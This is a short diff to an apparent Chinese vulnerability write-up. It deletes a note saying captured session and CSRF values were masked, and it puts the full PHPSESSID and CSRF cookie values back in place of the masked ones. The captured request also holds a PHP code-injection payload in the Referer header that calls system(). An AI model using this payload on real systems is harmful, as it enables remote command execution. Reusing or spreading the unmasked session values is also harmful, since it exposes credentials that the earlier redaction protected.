@@ -21,7 +21,6 @@ schema_version: "1"
 
 ## 核对与使用边界
 
-- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。
 
 本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。
 
@@ -243,7 +242,7 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate
 Connection: close
-Cookie: PHPSESSID=007********************l13; _csrf_name_5c702021=53e**************************601; _csrf_name_5c702021__ckMd5=635**********833
+Cookie: PHPSESSID=007erpeloffse8t2vi6ug42l13; _csrf_name_5c702021=53e683f11a071ecf207b7762c49c3601; _csrf_name_5c702021__ckMd5=6352ad6af0e1c833
 Upgrade-Insecure-Requests: 1
 Referer: <?php "system"($c);die;/*
 ```
